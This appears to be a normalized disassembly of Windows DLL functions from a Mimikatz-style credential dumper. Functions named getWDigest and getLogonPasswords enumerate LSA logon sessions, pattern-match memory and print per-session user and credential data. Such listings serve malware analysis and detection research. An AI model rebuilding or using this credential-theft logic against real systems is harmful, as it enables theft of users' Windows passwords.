je r-xdata
lea rcx [ r--data ]
mov [ r11 - 0x8 ] rdi
call [ GetModuleHandleW@IAT ]
mov rdi rax
test rax rax
je r-xdata
xor al al
mov rcx [ rsp + 0x170 ]
xor rcx rsp
call sub_180018450
add rsp 0x188
retn
mov al 0x1
mov rcx [ rsp + 0x170 ]
xor rcx rsp
call sub_180018450
add rsp 0x188
retn
lea rcx [ rsp + 0x40 ]
xor edx edx
mov r8d 0x11c
call sub_18001d7d0
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x40 ] 0x11c
call [ GetVersionExW@IAT ]
mov rdi [ rsp + 0x180 ]
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rax
mov [ rsp + 0x190 ] rbx
call [ GetProcAddress@IAT ]
mov rbx rax
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rsp + 0x44 ]
cmp edx 0x5
jne r-xdata
mov rbx [ rsp + 0x190 ]
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x20 ]
mov r9d 0x18
mov rcx rax
mov rdx rdi
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx 0x30
cmp edx 0x6
cmove eax ecx
mov [ rw-data ] eax
mov eax [ rsp + 0x48 ]
cmp eax 0x1
jne r-xdata
mov [ rsp + 0x198 ] rbp
mov ecx 0xd
mov [ rsp + 0x1a0 ] rsi
mov rsi [ rsp + 0x20 ]
call j_sub_180018a08
mov r8b 0x1
mov rbp rax
xor dil dil
cmp eax 0x2
jne r-xdata
mov [ rw-data ] 0x24
jmp r-xdata
test r8b r8b
je r-xdata
xor edx edx
lea rcx [ rbx - 0xd ]
cmp rcx rsi
setae dl
test edx edx
je r-xdata
mov ecx 0x30
mov [ rw-data ] ecx
jmp r-xdata
mov rcx rbp
call j_sub_180018b3c#2
mov rsi [ rsp + 0x1a0 ]
mov rbp [ rsp + 0x198 ]
test dil dil
je r-xdata
test dil dil
jne r-xdata
mov eax [ rbx - 0x4 ]
sub rbx 0x4
add eax 0x4
movsxd rcx eax
add rcx rbx
mov [ rw-data ] rcx
mov r9d 0xd
mov r8 rbx
mov rcx rbp
mov edx r9d
call sub_180018ab4
test eax eax
sete r8b
test r8b r8b
je r-xdata
test rsi rsi
je r-xdata
mov rdx [ rbp ]
lea rcx [ rsp + 0x160 ]
cmp rdx [ rcx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edx [ rbp + 0x8 ]
cmp edx [ rcx + 0x8 ]
jne r-xdata
dec rbx
jmp r-xdata
movzx edx [ rbp + 0xc ]
cmp dl [ rcx + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
sete dil
test dil dil
jne r-xdata
getWDigest
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x37 ]
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
xor r13d r13d
lea rax [ sub_180015e70 ]
mov rbx rcx
mov rcx [ r--data ]
mov [ rbp - 0x59 ] rax
mov eax [ r--data ]
mov [ rbp - 0x29 ] eax
movzx eax [ r--data ]
mov r14d 0x7
mov [ rbp - 0x25 ] ax
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x31 ] rcx
mov rdi rdx
mov [ rbp - 0x19 ] r14
mov [ rbp - 0x21 ] r14
lea rax [ rbp - 0x31 ]
cmp r14 0x8
lea r8 [ rbp - 0x31 ]
cmovae rax rcx
lea rdx [ rbp - 0x59 ]
lea rcx [ rbp - 0x9 ]
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x49 ] r13
mov [ rbp - 0x41 ] r13
mov [ rax + 0xe ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
lea r8 [ rbp - 0x51 ]
mov rdx rdi
mov rcx rbx
call sub_180016650
mov rsi [ rbp - 0x51 ]
movzx r12d al
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
movzx eax r12b
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rbp - 0x49 ]
cmp rsi rdi
je r-xdata
mov rcx rsi
call j_sub_180018b3c
lea rbx [ rsi + 0x20 ]
mov [ rbx ] r14
mov [ rbx - 0x8 ] r13
mov [ rbx - 0x18 ] r13w
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
getWDigestFunctions
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x140
lea rax [ r--data ]
mov rdi rcx
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r--data ]
xor ebx ebx
mov [ rsp + 0xa8 ] rax
mov [ rsp + 0x160 ] ebx
call sub_180003960
lea r11 [ rsp + 0x28 ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xf8 ] rbx
mov [ rsp + 0xf0 ] r11
call sub_180005300
mov [ rsp + 0x100 ] ax
cmp [ rsp + 0xf0 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
lea r11 [ r--data ]
mov [ rsp + 0x98 ] rbx
mov [ rsp + 0x28 ] r11
mov [ rsp + 0xa0 ] 0x4
call sub_180015900
lea rcx [ r--data ]
test al al
lea rbx [ r--data ]
cmovne rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
call sub_180008ab0
mov rdx rbx
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x110 ]
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov rcx rdi
mov rdx rax
call sub_180001b10
lea rcx [ rsp + 0xa8 ]
movzx ebx al
call sub_18000dd20
lea r11 [ r--data ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xa8 ] r11
call sub_180017208
movzx eax bl
mov rbx [ rsp + 0x150 ]
add rsp 0x140
pop rdi
retn
mov edx [ rsp + 0xb8 ]
lea rcx [ rsp + 0xa8 ]
xor r8d r8d
or edx 0x4
call sub_1800037f0
sub_180015e70
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0xe8 ]
sub rsp 0x1d0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xc0 ] rax
movzx r12d r8b
mov rsi rdx
mov rbx rcx
call sub_180015900
test al al
je r-xdata
mov r8d 0x11
lea rdx [ r--data ]
mov r9 [ rw-data ]
mov rdx [ r9 ]
cmp rdx r9
je r-xdata
mov r8d 0xe
lea rdx [ r--data ]
jmp r-xdata
mov ecx [ rbx + 0x4 ]
xor ebx ebx
mov [ rbp + 0x60 ] 0x7
mov [ rbp + 0x58 ] rbx
mov [ rbp + 0x48 ] bx
lea rcx [ rbp + 0x48 ]
call sub_1800023b0
lea rdx [ rbp + 0x48 ]
mov rcx rsi
call sub_180001b10
mov rdx [ rdx ]
cmp rdx r9
je r-xdata
mov eax [ rbx ]
cmp [ rdx + 0x20 ] eax
je r-xdata
jmp r-xdata
movsxd rdi [ rw-data ]
add rdi rdx
lea rdx [ rdi + 0x20 ]
lea rcx [ rbp + 0x48 ]
call sub_1800162e0
nop
mov [ rbp + 0x88 ] 0x7
xor ebx ebx
lea rcx [ rbp + 0x70 ]
mov [ rbp + 0x80 ] rbx
mov [ rbp + 0x70 ] bx
test r12b r12b
je r-xdata
cmp [ rdx + 0x24 ] ecx
jne r-xdata
movzx r8d [ rdi ]
shr r8 0x1
mov rdx [ rdi + 0x8 ]
call sub_1800023b0
nop
movzx r8d [ rdi + 0x10 ]
shr r8 0x1
mov [ rbp + 0xb0 ] 0x7
mov [ rbp + 0xa8 ] rbx
mov [ rbp + 0x98 ] bx
mov rdx [ rdi + 0x18 ]
lea rcx [ rbp + 0x98 ]
call sub_1800023b0
nop
lea rcx [ rsp + 0x30 ]
call sub_18000dc80
nop
mov edx 0xa
lea rcx [ rsp + 0x30 ]
call sub_18000db30
mov edi ebx
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
test [ rsp + rcx + 0x40 ] 0x6
jne r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x48 ]
call sub_180002260
lea rdx [ rbp + 0x70 ]
mov rcx rsi
call sub_180001b10
movzx edi al
jmp r-xdata
movsxd rax [ rax + 0x4 ]
lea rcx [ rsp + rax + 0x30 ]
test edi edi
je r-xdata
mov rcx [ rsp + rcx + 0x78 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax [ rsp + 0x30 ]
cmp [ rbp + 0x60 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x70 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x98 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x48 ]
call sub_18000def0
lea rdx [ rbp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_18000ddd0
mov rdx rax
mov rcx rsi
call sub_180001b10
movzx edi al
lea rcx [ rbp - 0x48 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x48 ] r11
lea rcx [ rbp - 0x48 ]
call sub_180017208
nop
cmp [ rbp + 0xb0 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
movzx eax dil
jmp r-xdata
mov rcx [ rbp + 0x48 ]
call j_sub_180018b3c
mov [ rbp + 0xb0 ] 0x7
mov [ rbp + 0xa8 ] rbx
mov [ rbp + 0x98 ] bx
cmp [ rbp + 0x88 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x98 ]
call j_sub_180018b3c
xor r8d r8d
call sub_1800037f0
or edx 0x4
mov rcx [ rbp + 0xc0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x1d0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp + 0x70 ]
call j_sub_180018b3c
nop
sub_180016180
push rsi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rax [ rw-data ]
xor esi esi
mov [ rsp + 0x38 ] 0xc0334590
mov [ rsp + 0x3c ] 0xe9
test rax rax
jne r-xdata
setne al
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_180018450
add rsp 0x50
pop rsi
retn
lea rcx [ r--data ]
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rdi
call [ GetModuleHandleW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rax [ rw-data ]
call [ GetCurrentProcess@IAT ]
lea r9d [ rsi + 0x18 ]
lea r8 [ rsp + 0x20 ]
mov rcx rax
mov rdx rbx
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
mov rdi [ rsp + 0x20 ]
mov [ rsp + 0x68 ] rbp
mov ebp [ rsp + 0x28 ]
lea ecx [ rsi + 0x5 ]
add rbp rdi
mov [ rsp + 0x78 ] r12
call j_sub_180018a08
mov r8b 0x1
xor bl bl
mov r12 rax
test r8b r8b
je r-xdata
mov edx esi
lea rcx [ rdi + 0x5 ]
cmp rcx rbp
setbe dl
test edx edx
je r-xdata
mov rcx r12
call j_sub_180018b3c#2
mov r12 [ rsp + 0x78 ]
mov rbp [ rsp + 0x68 ]
test bl bl
je r-xdata
test bl bl
jne r-xdata
lea rax [ rdi + 0x1 ]
mov [ rw-data ] rax
jmp r-xdata
mov r9d 0x5
mov r8 rdi
mov rcx r12
mov edx r9d
call sub_180018ab4
test eax eax
sete r8b
test r8b r8b
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rdi [ rsp + 0x70 ]
test rax rax
test rbp rbp
je r-xdata
mov edx [ r12 ]
lea rcx [ rsp + 0x38 ]
cmp edx [ rcx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ r12 + 0x4 ]
cmp dl [ rcx + 0x4 ]
jne r-xdata
inc rdi
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
sete bl
test bl bl
jne r-xdata
sub_1800162e0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rsi rdx
mov rdi rcx
xor eax eax
mov [ rsp + 0x48 ] eax
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
xor r8d r8d
lea rdx [ r--data ]
call sub_1800023b0
mov [ rsp + 0x48 ] 0x1
cmp [ rsi ] 0x0
jbe r-xdata
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
movzx ecx [ rsi + 0x2 ]
call j_sub_180018a08
mov rbx rax
movzx r8d [ rsi + 0x2 ]
mov rdx [ rsi + 0x8 ]
mov rcx rax
call sub_180018670
movzx edx [ rsi + 0x2 ]
mov rcx rbx
call [ rw-data ]
movzx r8d [ rsi ]
shr r8 0x1
mov rdx rbx
mov rcx rdi
call sub_1800023b0
mov rcx rbx
call j_sub_180018b3c#2
getLogonPasswords
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x37 ]
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
xor r13d r13d
mov rbx rcx
lea rcx [ r--data ]
mov rdi rdx
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x49 ] r13
mov [ rbp - 0x41 ] r13
call [ GetModuleHandleW@IAT ]
lea r14d [ r13 + 0x7 ]
test rax rax
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
mov rcx [ r--data ]
lea rax [ sub_18000f280 ]
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x59 ] rax
mov eax [ r--data ]
mov [ rbp - 0x31 ] rcx
mov [ rbp - 0x29 ] eax
mov [ rbp - 0x19 ] r14
mov [ rbp - 0x21 ] 0x6
lea rax [ rbp - 0x31 ]
cmp r14 0x8
lea r8 [ rbp - 0x31 ]
cmovae rax rcx
lea rcx [ rbp - 0x9 ]
lea rdx [ rbp - 0x59 ]
mov [ rax + 0xc ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
mov rcx [ r--data ]
lea rax [ sub_180015e70 ]
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x59 ] rax
mov eax [ r--data ]
mov [ rbp - 0x31 ] rcx
mov [ rbp - 0x29 ] eax
movzx eax [ r--data ]
mov [ rbp - 0x19 ] r14
mov [ rbp - 0x25 ] ax
mov [ rbp - 0x21 ] r14
lea rax [ rbp - 0x31 ]
cmp r14 0x8
lea r8 [ rbp - 0x31 ]
lea rdx [ rbp - 0x59 ]
cmovae rax rcx
lea rcx [ rbp - 0x9 ]
mov [ rax + 0xe ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
lea r8 [ rbp - 0x51 ]
mov rdx rdi
mov rcx rbx
call sub_180016650
mov rsi [ rbp - 0x51 ]
movzx r12d al
test rsi rsi
je r-xdata
mov rcx [ r--data ]
lea rax [ sub_1800155e0 ]
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x59 ] rax
movzx eax [ r--data ]
mov [ rbp - 0x31 ] rcx
mov [ rbp - 0x29 ] ax
mov [ rbp - 0x19 ] r14
mov [ rbp - 0x21 ] 0x5
lea rax [ rbp - 0x31 ]
cmp r14 0x8
lea r8 [ rbp - 0x31 ]
cmovae rax rcx
lea rcx [ rbp - 0x9 ]
lea rdx [ rbp - 0x59 ]
mov [ rax + 0xa ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
movzx eax r12b
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rbp - 0x49 ]
cmp rsi rdi
je r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
mov rcx rsi
call j_sub_180018b3c
lea rbx [ rsi + 0x20 ]
nop [ rax + rax ] ax
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
mov [ rbx ] r14
mov [ rbx - 0x8 ] r13
mov [ rbx - 0x18 ] r13w
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
sub_180016650
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1f0 ]
sub rsp 0x2f0
mov [ rsp + 0x78 ] 0xfffffffffffffffe
mov [ rsp + 0x348 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1e8 ] rax
mov [ rsp + 0x70 ] r8
mov r15 rdx
mov r12 rcx
xor ebx ebx
mov esi ebx
mov [ rsp + 0x2c ] ebx
mov dil 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x30 ]
call [ LsaEnumerateLogonSessions@IAT ]
test eax eax
js r-xdata
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x48 ] bx
mov r8d 0x36
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_1800023b0
lea rdx [ rsp + 0x48 ]
mov rcx r12
call sub_180001b10
mov r14d ebx
mov [ rsp + 0x28 ] ebx
cmp [ rsp + 0x30 ] ebx
jbe r-xdata
mov rcx [ rsp + 0x38 ]
call [ LsaFreeReturnBuffer@IAT ]
movzx eax dil
jmp r-xdata
mov [ rsp + 0x40 ] rbx
mov rcx [ rbp + 0x1e8 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x348 ]
add rsp 0x2f0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x20 ] rbx
mov r13d r14d
mov rax [ rsp + 0x38 ]
lea rcx [ rax + r13 * 8 ]
lea rdx [ rsp + 0x20 ]
call [ LsaGetLogonSessionData@IAT ]
test eax eax
js r-xdata
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x48 ] bx
mov r8d 0x35
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_1800023b0
lea rdx [ rsp + 0x48 ]
mov rcx r12
call sub_180001b10
movzx edi al
mov rax [ rsp + 0x20 ]
movzx r8d [ rax + 0x10 ]
shr r8 0x1
mov rdx [ rax + 0x18 ]
mov [ rbp + 0x1c8 ] 0x7
mov [ rbp + 0x1c0 ] rbx
mov [ rbp + 0x1b0 ] bx
lea rcx [ rbp + 0x1b0 ]
call sub_1800023b0
nop
mov rax [ rsp + 0x20 ]
movzx r8d [ rax + 0x30 ]
shr r8 0x1
mov rdx [ rax + 0x38 ]
mov [ rbp + 0x1a0 ] 0x7
mov [ rbp + 0x198 ] rbx
mov [ rbp + 0x188 ] bx
lea rcx [ rbp + 0x188 ]
call sub_1800023b0
nop
mov rax [ rsp + 0x20 ]
movzx r8d [ rax + 0x20 ]
shr r8 0x1
mov rdx [ rax + 0x28 ]
mov [ rbp + 0x178 ] 0x7
mov [ rbp + 0x170 ] rbx
mov [ rbp + 0x160 ] bx
lea rcx [ rbp + 0x160 ]
call sub_1800023b0
nop
lea rax [ r--data ]
mov [ rbp - 0x80 ] rax
or esi 0x1
mov [ rsp + 0x2c ] esi
lea rax [ r--data ]
mov [ rbp + 0x8 ] rax
lea rcx [ rbp + 0x8 ]
call sub_180003960
lea r11 [ rbp - 0x78 ]
mov [ rbp + 0x50 ] r11
mov [ rbp + 0x58 ] rbx
lea rcx [ rbp + 0x8 ]
call sub_180005300
mov [ rbp + 0x60 ] ax
cmp [ rbp + 0x50 ] 0x0
jne r-xdata
test dil dil
je r-xdata
mov rax [ rbp - 0x80 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x80 ] rax
lea rcx [ rbp - 0x78 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rbp - 0x78 ] rax
mov [ rbp - 0x8 ] rbx
mov edi 0x4
mov [ rbp ] edi
lea edx [ rdi + 0x6 ]
lea rcx [ rbp - 0x80 ]
call sub_18000db30
mov rax [ rbp - 0x80 ]
movsxd rcx [ rax + 0x4 ]
test [ rbp + rcx - 0x70 ] 0x6
jne r-xdata
mov edx [ rbp + 0x18 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0x8 ]
call sub_1800037f0
nop
movsxd rax [ rax + 0x4 ]
lea rcx [ rbp + rax - 0x80 ]
test ebx ebx
je r-xdata
mov rcx [ rbp + rcx - 0x38 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx edi
mov rax [ rbp - 0x80 ]
mov rbx [ rsp + 0x38 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x80 ]
call sub_180008ab0
mov rcx rax
mov rdi [ rsp + 0x40 ]
mov edx [ rdi + rbx + 0x4 ]
call sub_180016c60
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
mov edx [ rdi + rbx ]
call sub_180005d90
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x188 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x1b0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x160 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x48 ]
lea rcx [ rbp - 0x80 ]
call sub_18000ddd0
mov rdx rax
mov rcx r12
call sub_180001b10
movzx edi al
mov rax [ rsp + 0x70 ]
mov rbx [ rax ]
cmp rbx [ rax + 0x8 ]
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx [ rsp + 0x20 ]
call [ LsaFreeReturnBuffer@IAT ]
nop
lea rcx [ rbp + 0x8 ]
call sub_18000dd20
lea rax [ r--data ]
mov [ rbp + 0x8 ] rax
lea rcx [ rbp + 0x8 ]
call sub_180017208
nop
cmp [ rbp + 0x178 ] 0x8
jb r-xdata
mov r14 rax
xor r8d r8d
call sub_1800037f0
or edx 0x4
mov [ rbp + 0x178 ] 0x7
xor ebx ebx
mov [ rbp + 0x170 ] rbx
mov [ rbp + 0x160 ] bx
cmp [ rbp + 0x1a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x160 ]
call j_sub_180018b3c
mov rax [ rbp + 0x70 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx + 0x70 ] rax
lea rcx [ rbp + 0x78 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rbp + 0x78 ] rax
mov [ rbp + 0xe8 ] rdi
mov [ rbp + 0xf0 ] 0x4
lea rdi [ rbx + 0x8 ]
mov edx 0x9
lea rcx [ rbp + 0x70 ]
call sub_180008d10
mov rcx rax
mov rdx rdi
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
lea rdx [ rsp + 0x48 ]
lea rcx [ rbp + 0x70 ]
call sub_18000ddd0
mov rdx rax
mov rcx r12
call sub_180001b10
mov r11 [ r15 + 0x8 ]
cmp [ r15 ] r11
sete r8b
mov rax [ rsp + 0x38 ]
lea rcx [ rax + r13 * 8 ]
mov rdx r12
call [ rbx ]
mov [ rsp + 0x60 ] 0x7
xor eax eax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x48 ] ax
lea r8d [ rax + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_1800023b0
lea rdx [ rsp + 0x48 ]
mov rcx r12
call sub_180001b10
movzx edi al
lea rcx [ rbp + 0xf8 ]
call sub_18000dd20
lea rax [ r--data ]
mov [ rbp + 0xf8 ] rax
lea rcx [ rbp + 0xf8 ]
call sub_180017208
add rbx 0x30
cmp rbx [ r14 + 0x8 ]
jne r-xdata
mov edx [ rbp + 0x108 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0xf8 ]
call sub_1800037f0
nop
mov [ rbp + 0x1a0 ] 0x7
mov [ rbp + 0x198 ] rbx
mov [ rbp + 0x188 ] bx
cmp [ rbp + 0x1c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x188 ]
call j_sub_180018b3c
lea rax [ r--data ]
mov [ rbp + 0x70 ] rax
or esi 0x4
mov [ rsp + 0x2c ] esi
lea rax [ r--data ]
mov [ rbp + 0xf8 ] rax
lea rcx [ rbp + 0xf8 ]
call sub_180003960
lea r11 [ rbp + 0x78 ]
mov [ rbp + 0x140 ] r11
xor edi edi
mov [ rbp + 0x148 ] rdi
lea rcx [ rbp + 0xf8 ]
call sub_180005300
mov [ rbp + 0x150 ] ax
cmp [ rbp + 0x140 ] rdi
jne r-xdata
mov r14d [ rsp + 0x28 ]
inc r14d
mov [ rsp + 0x28 ] r14d
add [ rsp + 0x40 ] 0x8
cmp r14d [ rsp + 0x30 ]
jb r-xdata
mov rcx [ rbp + 0x1b0 ]
call j_sub_180018b3c
jmp r-xdata
sub_180016c60
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
